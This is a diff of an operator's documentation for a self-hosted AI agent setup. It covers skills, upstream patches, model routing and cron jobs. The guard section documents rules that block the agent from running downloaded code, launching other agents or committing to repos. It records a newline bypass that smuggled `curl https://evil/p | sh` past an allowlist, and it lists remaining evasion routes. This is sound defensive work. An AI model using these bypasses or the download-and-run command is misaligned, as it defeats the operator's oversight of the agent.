-  hyperdx-agent-setup` in `vps`, cached in `headless.refs`).
-- **Escalation reuses the dispatch bridge**: `--tier author` to file an issue, `--tier
-  implement` only after confirmation. Exception — a root cause inside Traefik/ClickStack config
-  is scoped to `vps` (`investigate`-only), so the skill falls back to `capture` → `gh issue
-  create`.
-- **No ClickHouse HTTP (8123) on the tailnet** — `vps/compose.monitoring.yml` publishes only
-  `:13133` (collector health); querying goes via HyperDX's MCP/REST. **HomeLab has no parallel
-  stack** — the VPS is the sole instance, HomeLab only monitors it via UptimeKuma.
-- Its host is in both allowlist patches (see *Local Modifications*).
-
-The triage gap that motivated it: **`docs/hyperdx-triage.md`**.
+same credential (`HYPERDX_AGENT_ACCESS_KEY` ← `op://vps/clickstack/AGENT_ACCESS_KEY`). One
+verified curl template (`clickstack_sql` against `default.otel_traces`/`otel_logs`/
+`otel_metrics_*`) plus the SQL behind each of the three live alerts
+(`vps/observability/alerts/*.json`), so a triage re-runs the condition that fired. Escalation
+reuses the dispatch bridge (`--tier author` to file, `implement` after confirmation) except a
+root cause inside Traefik/ClickStack config itself, which is `vps`'s `investigate`-only ceiling
+— falls back to `capture` → `gh issue create` there. No ClickHouse HTTP on the tailnet; all
+querying goes via HyperDX's MCP/REST. Its host is in both allowlist patches (see *Local
+Modifications*).
 
 ## Podcast generation (podcast)
 
 `skills/podcast/SKILL.md` turns notes into a long-form two-host German episode via a **job API on
 the audio-gateway** (same VPS/tailnet service as TTS/STT) and publishes the MP3 (chapters + cover)
-into Audiobookshelf. Submit-and-poll like `research-gateway`, **not** a single
-`/v1/audio/speech` call like `briefing-tts`.
-
-**No secret** — tailnet-gated, caller identified by the bearer label `hermes`
-(`Authorization: Bearer hermes` + `x-audio-source: hermes`), the same literal
-`tts.openai.api_key`/`stt.openai.api_key` use; nothing new in `.env.tpl`. SOUL.md's TTS rule 4
-("NEVER curl an audio endpoint") exempts `/v1/podcasts*` — there is no native tool for this
-pipeline. `audio-gateway.jkrumm.com` is in both allowlist patches.
+into Audiobookshelf. Submit-and-poll like `research-gateway`, **not** a single `/v1/audio/speech`
+call like `briefing-tts`. **No secret** — tailnet-gated, caller identified by the bearer label
+`hermes`. SOUL.md's TTS rule 4 ("NEVER curl an audio endpoint") exempts `/v1/podcasts*` — there is
+no native tool for this pipeline.
 
 ## Agents overview (agents)
 
@@ -391,143 +265,84 @@ Two skills, deliberately distinct roles — don't blur them:
   `~/SourceRoot/brain/`, also a git repo shared with Claude Code (`/brain`). A LaunchAgent
   pulls+pushes every 5 min; **on this mini it never auto-commits, so a write isn't durable until
   committed**. **CLI-first** (`obsidian-cli` through the running app's API), filesystem fallback
-  when Obsidian is down. No secret. Two layers, validated by `node .scripts/vault-lint.mjs`:
-  strict atomic English concept notes in `wiki/` (`type`+`description`), light curated
-  `Projects`/`Areas` linking *down* into it; no `Resources` tier. Contract:
-  `~/SourceRoot/brain/AGENTS.md`.
+  when Obsidian is down. No secret. Two layers: strict atomic English concept notes in `wiki/`,
+  light curated `Projects`/`Areas` linking *down* into it. Contract: `~/SourceRoot/brain/AGENTS.md`.
 - **`karakeep`** — the **read-later bucket**: REST on `https://karakeep.jkrumm.com/api/v1`
-  (Bearer `$KARAKEEP_API_KEY` ← `op://hermes/karakeep/api-key`, Tailscale-only). Links/text,
-  full-text search (Meili — no semantic search in 0.32.0), lists incl. smart, tags, highlights;
-  AI auto-tagging async. `skills/karakeep/state.json` (gitignored, seeded by `make setup`) caches
-  lists+tags, refresh-on-miss.
+  (Bearer `$KARAKEEP_API_KEY`, Tailscale-only). Links/text, full-text search, lists, tags,
+  highlights, async AI auto-tagging.
 
 **Routing** (`capture` is the router): KaraKeep = reference/reading you consume · Obsidian =
 durable knowledge you author · TickTick = human action · GitHub = code change.
 
 **Bundled-skill collision:** upstream's stock `obsidian` skill was removed from
 `~/.hermes/skills/note-taking/obsidian/` so ours is canonical, and it **re-seeds on `hermes
-update`** — `/hermes-update` carries the `rm -rf` step. Kobo/Readeck plan + detail:
-**`docs/second-brain.md`**.
+update`** — `/hermes-update` carries the `rm -rf` step. **Kobo/e-reader (not built):** reading
+vault notes on the Kobo via KOReader would use Readeck (bidirectional highlight sync via
+`iceyear/readeck.koplugin`), not KaraKeep (save-only) or Wallabag (no sync-back) — a homelab
+container + a new `readeck` skill pushing curated content and pulling highlights back, nothing
+scheduled.
 
 ## Wild Rift (champion pool tracker)
 
-`skills/wildrift/SKILL.md` maintains the four-champion pool — Thresh, Pyke (support), Rammus,
-Hecarim (jungle). **Vault-first:** builds, runes, matchups, bans and a dated stats snapshot live
-at `~/SourceRoot/brain/Areas/Gaming/Wild Rift/*.md` (curated surface, not `wiki/`); the open web
+`skills/wildrift/SKILL.md` maintains the **eleven-champion pool** across jungle, support, mid and
+baron. **Vault-first:** builds, runes, matchups, bans and a dated stats snapshot live at
+`~/SourceRoot/brain/Areas/Gaming/Wild Rift/*.md` (curated surface, not `wiki/`); the open web
 via `research-gateway` only *refreshes* a note when a patch moved. No secret, no external API.
 Writes use the `obsidian` CLI-first contract and the `git -C ~/SourceRoot/brain …` exemption
 (never push — the LaunchAgent syncs).
 
-- **Never a build site directly** — no Riot/Tencent/build-site host is in tirith's
-  `_ALLOWED_PIPELINE_HOSTS` or the cron scanner's `_trusted_api_suffixes`, so every fetch routes
-  through `research-gateway`.
-- **Stats are China-server only** (Riot publishes no Wild Rift API) and swing hard by rank tier
-  (0-4 — Hecarim ~45% WR at tier 0 vs ~53.7% at tier 4): **qualify every answer by rank**.
-- An Argo `/wildrift/*` group is **built but not deployed**; the skill tells the agent not to
-  call it. Detail: **`docs/wildrift.md`**.
+**Never a build site directly** — no Riot/Tencent/build-site host is trusted by tirith or the
+cron scanner, so every fetch routes through `research-gateway`. **Stats are China-server only**
+and swing hard by rank tier (0-4 — Hecarim ~45% WR at tier 0 vs ~53.7% at tier 4): qualify every
+answer by rank. An Argo `/wildrift/*` group is **built but not deployed**; the skill tells the
+agent not to call it.
 
 ## Local Modifications to Upstream
 
 Re-apply after `hermes update`: **one `.patch` file per patched upstream file**, each with `git
 apply --3way` (`/hermes-update` carries the loop). `ls patches/` is the count, `make patch-check`
-proves they are applied — deliberately not restated here (it drifted at four of the last five
-updates). All are regenerated against the current baseline (**v0.21.0**, upstream
-`d8a07768c5`), so only a structural rewrite of a touched function needs hand-resolving.
+proves they are applied — deliberately not restated here (it drifted repeatedly). Baseline
+**v0.21.0**, upstream `d8a07768c5`.
 
-**2026-09-07 — every patch moved file.** Upstream landed **5503 commits in six days** under an
-unchanged version number, splitting the monoliths (`gateway/run.py` 22k → 5.5k lines,
-`tools/tts_tool.py` 3k → 682, `hermes_cli/web_server.py` 18k → 1.8k, `tools/tirith_security.py`
-1248 → 546). All ten patches conflicted and were hand-ported; the **patch names are unchanged**
-(they are identifiers cited by the `# LOCAL MODIFICATION (patches/<name>.patch)` markers), so
-three of them now name a file they no longer touch — read the table's left column, not the
-patch name.
+**2026-09-07 — every patch moved file.** Upstream landed 5503 commits in six days under an
+unchanged version number, splitting every monolith apart. The **patch names are unchanged**
+(identifiers cited by `# LOCAL MODIFICATION (patches/<name>.patch)` markers), so three now name a
+file they no longer touch — read the table's left column, not the patch name.
 
 | Upstream file | `patches/…` | What it does |
 |-|-|-|
-| `tools/tts_tool_openai.py` + `tools/tts_tool.py` | `tts-tool-audio-title` | name saved audio from the gateway's `X-Audio-Title` header instead of `tts_<timestamp>.mp3` (also `tts_reply_<uuid>` auto voice replies) |
-| `gateway/run_voice.py` | `gateway-auto-tts-voice-only` | auto-TTS answers **voice input only** (`and is_voice_input` in `_should_send_voice_reply`'s fallback), so alerts stop coming back as MP3s. `/voice all` per chat still speaks everything |
-| `hermes_cli/web_routers/audio.py` | `serve-speak-summary` | Desktop relay read-aloud: a first frame carrying whole text + `done` and ≥ `voice.speak_summary_min_chars` (config **120**, 0 = off) is summarised in one gateway call. `openai` streamer only; needs `voice.client_direct: false` |
-| `plugins/platforms/slack/adapter.py` | `slack-cannot-reply-to-message` | `format_message()` pre-steps (`*` → `-`, strip backticks round emoji shortcodes) + `send()` retry: on `cannot_reply_to_message`, drop `thread_ts` and retry flat |
-| `gateway/platforms/base.py` | `slack-media-inline-reply-anchor` | pass the text reply's anchor to `send_voice`/`send_video`/`send_document`. **Dormant** under `reply_in_thread: true`, kept applied |
-| `agent/client_lifecycle.py` | `run-agent-third-party-endpoint-token-refresh` | broaden `_try_refresh_anthropic_client_credentials`'s skip from Azure-only to every third-party Anthropic-compatible endpoint (stops `~/.claude/.credentials.json` OAuth replacing the IU key). **Dormant**, kept applied |
+| `tools/tts_tool_openai.py` + `tools/tts_tool.py` | `tts-tool-audio-title` | name saved audio from the gateway's `X-Audio-Title` header instead of `tts_<timestamp>.mp3` |
+| `gateway/run_voice.py` | `gateway-auto-tts-voice-only` | auto-TTS answers **voice input only**, so alerts stop coming back as MP3s. `/voice all` per chat still speaks everything |
+| `hermes_cli/web_routers/audio.py` | `serve-speak-summary` | Desktop relay read-aloud summarization. **Dormant** — the relay it serves was torn down 2026-09-07, kept applied |
+| `plugins/platforms/slack/adapter.py` | `slack-cannot-reply-to-message` | mrkdwn normalization + `cannot_reply_to_message` retry (drop `thread_ts`, retry flat) |
+| `gateway/platforms/base.py` | `slack-media-inline-reply-anchor` | pass the text reply's anchor to media senders. **Dormant** under `reply_in_thread: true`, kept applied |
+| `agent/client_lifecycle.py` | `run-agent-third-party-endpoint-token-refresh` | stop `~/.claude/.credentials.json` OAuth replacing the IU key. **Dormant**, kept applied |
 | `tools/tirith_security.py` | `tirith-hermes-guards` | four guard rules, below |
-| `tools/cronjob_prompt_scan.py` | `cronjob-tools-allowlist-argo-bearer` | argo/karakeep/research/hyperdx/audio-gateway bearer allowlist in the shared `_strip_cron_safe_constructs`, so a legitimate bearer curl in a cron prompt stops tripping `exfil_curl_auth_header`. GitHub's exempt shape is `Authorization: token $VAR`, **not** `Bearer` |
-| `hermes_cli/runtime_provider.py` | `runtime-provider-iu-responses-api` | route the IU `…/openai/v1` leg onto `codex_responses` in `_detect_api_mode_for_url` — **the only way to run a reasoning effort here** |
+| `tools/cronjob_prompt_scan.py` | `cronjob-tools-allowlist-argo-bearer` | argo/karakeep/research/hyperdx/audio-gateway bearer allowlist so a legitimate cron curl stops tripping `exfil_curl_auth_header` |
+| `hermes_cli/runtime_provider.py` | `runtime-provider-iu-responses-api` | route the IU `…/openai/v1` leg onto `codex_responses` — **the only way to run a reasoning effort here** |
 | `agent/transports/chat_completions.py` | `transport-iu-reasoning-effort` | drop `reasoning_effort` on a gpt-5.x request carrying function tools; clamp `xhigh`/`max` → `high` for the Anthropic fallback |
 
-Re-apply shape:
-`cd ~/.hermes/hermes-agent && git apply ~/SourceRoot/hermes-agent/patches/<name>.patch`.
+Re-apply: `cd ~/.hermes/hermes-agent && git apply ~/SourceRoot/hermes-agent/patches/<name>.patch`.
 **Anything touching `tirith_security.py`, `cronjob_prompt_scan.py` or `runtime_provider.py`
 needs a gateway restart** (`launchctl kickstart -k gui/$(id -u)/ai.hermes.gateway`) — modules are
-imported once at startup, so a green in-process test says nothing about the running process.
-`serve-speak-summary` targets the `hermes serve` relay, which no longer runs here (teardown
-2026-09-07) — the patch stays applied but is dormant.
+imported once at startup.
 
-**The four guard rules in `tirith-hermes-guards.patch`**, each with its own suite (run with
-`~/.hermes/hermes-agent/venv/bin/python3`):
-
-- **trusted-pipeline allowlist** — an `allow` early-return so tirith's `[HIGH] Pipe to
-  interpreter` stops firing on `curl https://<trusted>/… | jq/python3`. Hosts: `argo`,
-  `karakeep`, `research`, `hyperdx`, `audio-gateway`.jkrumm.com **only** + a safe program set;
-  any redirect, `$(...)`, backtick, `;`, `&&`, `||`, `&`, `(`, `>` defers to tirith.
-- **`download_then_execute`** — blocks the two-step form of `curl | sh` that upstream tirith
-  allows (`curl -o /tmp/f … && sh /tmp/f`, `wget -qO`, `chmod +x`, `$(cat …)`, `<(curl …)`;
-  taint follows one `cp`/`mv`/`install` hop). Sits **before** the circuit breaker and the
-  allowlist, so it holds when tirith is unavailable (`tirith_fail_open` defaults **True**).
-  `test_download_guard.py`: 20/20 blocked, 27/27 allowed, plus 2/2 newline-smuggled
-  pipeline bypasses blocked and 1/1 quoted newline still allowed.
-- **`raw_agent_invocation`** — blocks Hermes composing its own `claude` / `claude_iu` /
-  `claude_bridge` / `ca` / `opencode` / `rd bg|work` / `agent-dispatch` / `remote-dev.sh` call, a
-  `herdr agent start|prompt|send-keys|attach` that would place or drive one, or a
-  `herdr pane run|send-text|send-keys … <command>` whose typed command is any of the above
-  (the command is re-scanned with the whole guard, so `herdr pane run argo 'rd bg …'` is caught
-  one hop down). `herdr agent list|get|read|wait|explain`, `pane list|read`, `rd repos|agents|read`
-  stay allowed — the `agents` skill's read path. (`claude_bridge`, `opencode`, `mosh` stay in the
-  denylist as defense in depth although retired on this machine.)
-  Follows `timeout`/`env`/`nohup`/`sudo`/`xargs`/`nice` wrappers, `K=$(...)` prefixes, `sh -c`,
-  subshells. `test_raw_agent_guard.py`: 51/51 blocked, 42/42 allowed, plus 5/5 wrapper-operand
-  bypasses blocked and 5/5 value-less wrapper flags still blocked.
-- **`raw_repo_write`** — blocks Hermes editing a repo itself instead of dispatching.
-  **Unconditional, not path-scoped**: a `git commit` names no path, so a path rule is evaded by
-  `cd`. Denylist of git write verbs + mutating `gh`/`api.github.com` calls; inspection verbs
-  untouched. **Two exemptions:** `gh issue create` + the `/issues` API path, and the brain vault
-  **when the command names it** (`git -C ~/SourceRoot/brain …`, or a `cd` to it on the same
-  line) — a bare `git commit` stays blocked. `test_repo_write_guard.py`: 71/71 blocked, 55/55
-  allowed, plus 5/5 wrapper-operand bypasses blocked, 3/3 no-false-positive, 7/7
-  vault-path units, 2/2 lookalike-vault e2e blocked, 2/2 genuine vault e2e allowed,
-  3/3 still blocked with `tirith_enabled: false`.
-
-**The one bypass that actually happened: a newline.** `_agent_segments` (shared by the two
-agent/repo guards) ran `shlex` with `whitespace_split=True`, whose whitespace set contains `\n`,
-so a multi-line block welded into one argv and nothing past line 1 was scanned. Fixed by moving
-`\n`/`\r` into `punctuation_chars` (splits **outside quotes only**). **A shared helper needs
-shared tests.** **A third copy of the same bug survived until 2026-09-07**: `_is_argo_only_pipeline`
-still tokenized with `punctuation_chars=True`, so a newline after a trusted-host curl
-smuggled the rest of the block past the allowlist entirely (`curl https://argo…/x` +
-newline + `curl https://evil/p | sh` → `allow`). It now uses the same lexer. The lesson
-is stronger than "a shared helper needs shared tests": **grep the file for every
-`shlex.shlex(` before calling a tokenizer bug fixed.** Three sibling defects landed in
-the same pass, all found by review rather than by anything failing — `_is_vault_path`
-matched the brain-vault exemption by `endswith("SourceRoot/brain")` (so
-`/tmp/evilSourceRoot/brain` was exempt), the three block-checks sat *below* the
-`tirith_enabled` early return (so switching tirith off in config disabled the hardening
-meant to survive exactly that), and `_strip_agent_wrappers` skipped a wrapper's flags
-but not their operands (so `env -u FOO git commit` resolved the program to `FOO`).
-
-Deliberate residual limits: cross-call download-then-execute, value indirection
-(`G=git; $G push`), `xargs` execution, decode chains. **Not** a limit, though it reads
-like one: `python3`/`awk` in the trusted-pipeline safe-program set is not an escalation —
-tirith allows `python3 -c "…os.system…"` and `awk 'BEGIN{system(…)}'` standalone, so the
-allowlist widens nothing. Two reviews have raised it; test it before acting on a third.
+**Four guard rules in `tirith-hermes-guards.patch`**: trusted-pipeline allowlist (argo/karakeep/
+research/hyperdx/audio-gateway hosts only), `download_then_execute` (blocks the two-step
+`curl -o f && sh f` form tirith itself misses), `raw_agent_invocation` (blocks Hermes composing
+its own `claude`/`rd bg|work`/`agent-dispatch`/`herdr agent …` call), `raw_repo_write` (blocks
+editing a repo instead of dispatching — two exemptions: GitHub issues, and the brain vault when
+the command names it). All three write/execution guards share **one tokenizer bug history** — a
+newline inside `shlex.whitespace_split` let a multi-line command scan only its first line,
+exploited twice before every guard moved `\n`/`\r` into `punctuation_chars`. Rules, current test
+counts, the full incident record: **`docs/guards.md`**.
 
 **Slack threading is a context-window boundary.** `slack.reply_in_thread: true` makes
 `build_session_key()` append `thread_ts` whenever `source.thread_id` is set, so **one thread ==
 one session == one context window**. Continue a topic *inside* its thread; a new top-level
-message is deliberately a clean slate. `session_reset.mode` is unset, so only the compressor
-bounds a long thread.
+message is deliberately a clean slate.
 
 Per-file detail, every retired patch and why, the v0.18.x platform rewrite: **`docs/patches.md`**.
-Guard rationale + incident record: **`docs/guards.md`**.
 
 ## Model, context window and reasoning effort
 
@@ -536,77 +351,41 @@ published source disagrees in some direction. Re-probe after an endpoint change.
 
 | | Value | How established |
 |-|-|-|
-| Input cap, `gpt-5.6-luna` | **922,000** | 900k ok; 1.1M → `context_length_exceeded` "configured limit of 922000 tokens" (a *combined* input+reasoning+output budget) |
+| Input cap, `gpt-5.6-luna` | **922,000** | 900k ok; 1.1M → `context_length_exceeded` (a *combined* input+reasoning+output budget) |
 | `/v1/models` metadata | `ContextSize: "105000"` | **Wrong** — 110k/260k/520k/900k all succeed. Never configure from it |
-| Published model card | 1,050,000 in / 128,000 out | every vendor agrees; the gateway's limit is lower |
 | `claude-sonnet-4-6-eu` | ≥300,000 proven | config sits at 300,000; metadata claims 1M, untested above |
 | Efforts, gpt-5.6 family | `none, low, medium, high, xhigh` | `max` refused here; `minimal` isn't a gpt-5.6 value |
 | Efforts, Anthropic leg | `none, low, medium, high` | `xhigh` refused by the IU LiteLLM gateway |
 
 **Reasoning effort only exists on the Responses API here.** `/v1/chat/completions` refuses any
 effort once the request carries function tools — and Hermes always sends tools, so the effort
-400s **every** turn, burns the retry budget and lands the conversation on the Anthropic fallback
-while looking healthy. Hence `model.api_mode: codex_responses` + the runtime-provider patch.
-**Tell:** `Fallback activated: gpt-5.6-luna → claude-sonnet-4-6-eu` every turn in
-`~/.hermes/logs/agent.log`, with `Ignoring persisted custom api_mode=codex_responses for
-non-OpenAI endpoint` one line above — that second line means the patch fell off, which is what a
-`hermes update` does.
+400s **every** turn and lands the conversation on the Anthropic fallback while looking healthy.
+Hence `model.api_mode: codex_responses` + the runtime-provider patch. **Tell:** `Fallback
+activated: gpt-5.6-luna → claude-sonnet-4-6-eu` every turn in `~/.hermes/logs/agent.log`, with
+`Ignoring persisted custom api_mode=codex_responses for non-OpenAI endpoint` one line above —
+that second line means the patch fell off, which is what a `hermes update` does.
 
 - **`agent.log` is not rotated per process** — slice every read at the current process start
-  (`pgrep -f "hermes_cli.main gateway run"` → `ps -o lstart=`), or a days-old burst reads as
-  current. `skills/hermes-gateway/` owns this (Rule 0 = the slicing; `references/model-routing.md`
-  has the six settling commands). **Hermes may not restart its own gateway** — `hermes-ops.sh`
-  excludes `ai.hermes.gateway`, and `claude-dispatch` is no workaround (no launchd authority).
-- **The live key is `agent.reasoning_effort`, not `model.reasoning_effort`** —
-  `resolve_reasoning_config()` (`hermes_constants.py`) reads `agent.reasoning_overrides` then
-  `agent.reasoning_effort`; nothing reads the `model` copy. Both are `high` so a stale value
-  can't be acted on; per-model overrides go in `agent.reasoning_overrides`.
-- **The Anthropic fallback shares this base URL and must not follow it onto Responses** —
-  `claude-sonnet-4-6-eu` 404s there. An explicit `api_mode` on a `fallback_providers` entry wins
-  over URL detection, which is why that entry spells out `chat_completions`.
-- **Compaction triggers at 240,000 tokens** (`compression.threshold_tokens`, absolute — the
-  *lower* of ratio and absolute governs). Two ratio traps: a window **under 512K** floors its
-  threshold at **0.75** (`_SMALL_CTX_THRESHOLD_PERCENT`), and the auxiliary compression model's
-  own `context_length` **clamps the trigger down to itself** — hence
-  `auxiliary.compression.context_length: 850000`, not the default 200,000. 240k also keeps
-  prompts below the **272k mark where OpenAI bills input 2× and output 1.5×**.
+  (`pgrep -f "hermes_cli.main gateway run"` → `ps -o lstart=`). `skills/hermes-gateway/` owns
+  this. **Hermes may not restart its own gateway.**
+- **The live key is `agent.reasoning_effort`, not `model.reasoning_effort`.**
+- **The Anthropic fallback shares this base URL and must not follow it onto Responses** — an
+  explicit `api_mode` on a `fallback_providers` entry wins over URL detection.
+- **Compaction triggers at 240,000 tokens** (absolute — the *lower* of ratio and absolute
+  governs). A window **under 512K** floors its threshold at **0.75**, and the auxiliary
+  compression model's own `context_length` clamps the trigger to itself — hence
+  `auxiliary.compression.context_length: 850000`, not the default 200,000.
 
-**Auxiliary lanes are separately routed — they are not the brain.** `auxiliary.<task>.{provider,
-model,base_url,api_key,api_mode}` picks a model per task; unset lanes fall through to `auto`, which
-means the flagship at `high`. Two are pinned off it deliberately:
+**Auxiliary lanes are separately routed, not the brain** — `title_generation` and `approval` are
+pinned off a flash/haiku model (the flagship 503s on their hardcoded `temperature`); `approval`
+runs the **native `/anthropic` leg**, 0.9s vs 3.0s through the OpenAI-compat shim, `provider`
+stays `custom` so it never reaches for `~/.claude` OAuth. **`delegation.*` (subagent routing)
+exists but is unused** — a Hermes child gets no `.claude/rules`/`skills`/PR artifact, so repo work
+stays on the dispatch bridge. **Core-tool deferral is on** (`tools.tool_search.enabled: auto`) —
+measured −19.8% off the cached tool prefix every turn; if Hermes ever claims it can't schedule
+something, check `cronjob_manage` isn't wrongly deferred rather than disabling the feature.
 
-| Lane | Model | Why not `gpt-5.6-luna` |
-|-|-|-|
-| `title_generation` | `gemini-2.5-flash-lite`, OpenAI leg | `title_generator.py` hardcodes `temperature=0.3` and gpt-5.x accepts only the default — every title 503'd then self-healed on a retry-without-temperature. ~0.7s instead of a reasoning turn |
-| `approval` | `claude-haiku-4-5`, **native `/anthropic` leg** (`${ANTHROPIC_BASE_URL}`, `api_mode: anthropic_messages`) | same 503 (`approval_smart.py` hardcodes `temperature=0`), and this gates every risky terminal command. Measured **0.9s native vs 3.0s** for the same model through the OpenAI-compat shim. `provider` stays `custom`, never `anthropic`, so the auxiliary client never reaches for `~/.claude` OAuth |
-
-There is **no config key to drop `temperature`** — `_fixed_temperature_for_model` is hardcoded to
-Kimi/Arcee and ignores provider profiles, so repinning the model is the only fix. Pinning the
-Anthropic leg needs the `anthropic` SDK **already present** in the gateway venv —
-`agent/anthropic_adapter.py` lazy-*imports* it (~220 ms saved at startup) and raises
-`ImportError` when it is missing, which `approval_smart.py` catches and turns into
-`escalate`. Fail-safe, but silent apart from one WARNING nothing watches, so a venv rebuild
-would quietly demote the classifier to a blanket escalation. Today: `anthropic 0.87.0`.
-`compression` and `web_extract` stay on luna: both need the 850k window.
-
-**Subagent routing (`delegation.*`) exists but is unused** — repo work goes to Claude Code via the
-dispatch bridge, and a Hermes child gets no `.claude/rules`, no `.claude/skills` and no PR artifact.
-It is worth considering only for read-heavy fan-out (parallel log/API triage). If one is ever
-pinned to a cheaper model: **`delegation.api_mode` is silently dropped unless `delegation.base_url`
-or `delegation.provider` is set too**, so `model: claude-*` alone inherits `codex_responses` and
-404s — the same trap the `fallback_providers` entry spells out `chat_completions` to avoid. A pin
-also costs the child its fallback chain and capability inheritance.
-
-**Core-tool deferral is on and wanted** (`tools.tool_search.enabled: auto`). 4 of 21 tools defer
-behind a 3-tool bridge — measured **−19.8% (~2,150 tokens) off the cached tool prefix every turn**
-on the real Slack toolset, not upstream's headline −49% (that is the desktop/GUI surface). It costs
-+1 turn when a deferred tool is actually needed. `threshold_pct: 10` in `config.yaml` is now a
-*listing budget*, not an activation gate. Deferral can never empty `tools`, so it does not interact
-with the reasoning-effort patches. Watch `cronjob_manage`: it is 69% of the deferred mass and
-upstream measured 16/18 discovery — if Hermes ever claims it can't schedule something, drop that
-one name from `tools.tool_search.defer` rather than disabling the feature.
-
-Narrative: **`docs/model-context-reasoning.md`**.
+Full numbers, lane rationale, deferral measurement: **`docs/model-context-reasoning.md`**.
 
 ## Shell script conventions
 
@@ -621,45 +400,31 @@ The incident it came from: **`docs/shell-conventions.md`**.
 
 ```bash
 make setup        # idempotent — symlinks, LaunchAgents, CC skills
-make status       # verify all of it (audio-gateway health, cron skill resolution, …)
+make status       # verify all of it
 make patch-check  # assert every patches/*.patch is applied to the live checkout
 ```
 
-Prerequisites: `hermes` CLI installed (README.md §2) · `audio-gateway` reachable at
-`…/health` · 1Password CLI authenticated as `tkrumm`. `make help` lists the rest
-(`cron-migrate`, `agents-teardown`).
+Prerequisites: `hermes` CLI installed, `audio-gateway` reachable, 1Password CLI authenticated as
+`tkrumm`. `make help` lists the rest.
 
 ## Editing Rules
 
 **Adding a Hermes skill:** create `skills/{name}/SKILL.md`, add `{name}` to `HERMES_SKILLS`, run
-`make setup`. For scheduled briefings, also wire it into the relevant `cron/*.prompt.txt` and
-re-sync `cron/jobs.json`.
+`make setup`, then **restart the gateway** — the skills-index system prompt is cached
+**in-process** and nothing but a restart or `skill_manager_tool` clears it, so `hermes skills
+list` shows a new skill the running gateway still can't see.
 
-**A new or renamed skill also needs a gateway restart.** The skills index in the system prompt
-is cached **in-process** (`_SKILLS_PROMPT_CACHE`, `agent/prompt_builder.py`) keyed on directory
-paths only, and nothing clears it except `skill_manager_tool` — so `hermes skills list` and the
-disk snapshot both show the new skill while the running gateway cannot. Verify after restarting:
-`./venv/bin/python3 -c "from agent.prompt_builder import build_skills_system_prompt as b; print('<name>' in b())"`.
+**Renaming or retiring a skill fails silently** — a cron job preloads skills *by name*, an
+unresolvable one logs `skill not found, skipping` at WARNING and the job still reports `ok`.
+`make status` asserts every skill in `~/.hermes/cron/jobs.json` resolves — run it after any
+rename.
 
-**Renaming or retiring one fails silently.** A cron job preloads skills *by name*; an
-unresolvable name logs `skill not found, skipping` at **WARNING**, the job runs anyway reporting
-`ok`, and `watchdog-poll.py` matches `ERROR|CRITICAL` only. `make status` asserts every skill in
-`~/.hermes/cron/jobs.json` resolves — **run it after any rename.**
-
-**Three layers move together, only two are in git.** `cron/*.prompt.txt` and `cron/*.md` are
-tracked; **`cron/jobs.json` is gitignored runtime state** and the live job holds its **own copy
-of the prompt** — editing the `.txt` alone changes nothing at runtime. Push through the CLI,
-never by hand-editing `jobs.json` under a running gateway:
-
-```bash
-hermes cron edit <job_id> --prompt "$(cat cron/morning-briefing.prompt.txt)"
-hermes cron edit <job_id> --skill argo-api --skill work    # replaces the set
-```
-
-`--clear-skills` is applied *after* `--skill` and wins, leaving `Skills: none` — pass `--skill`
-alone to replace a set. Verify with `hermes cron list`. `hermes cron run <job_id>` has **no
-dry-run and delivers for real** — retarget first (`--deliver slack:<test-channel>`), then
-restore. Detail: **`docs/scheduled-jobs.md`**.
+**`cron/jobs.json` is gitignored runtime state carrying its own copy of the prompt** — editing
+`cron/*.prompt.txt` alone changes nothing at runtime. Push through the CLI:
+`hermes cron edit <job_id> --prompt "$(cat cron/morning-briefing.prompt.txt)" --skill a --skill b`
+(`--clear-skills` applied after `--skill` wins — pass `--skill` alone to replace a set).
+`hermes cron run <job_id>` has **no dry-run and delivers for real** — retarget first
+(`--deliver slack:<test-channel>`), then restore. Detail: **`docs/scheduled-jobs.md`**.
 
 **Adding a CC slash command:** create `.claude/skills/{name}/SKILL.md` — auto-loaded here, no
 symlink or Makefile change. **Patches:** save the diff under `patches/`, add a table row in
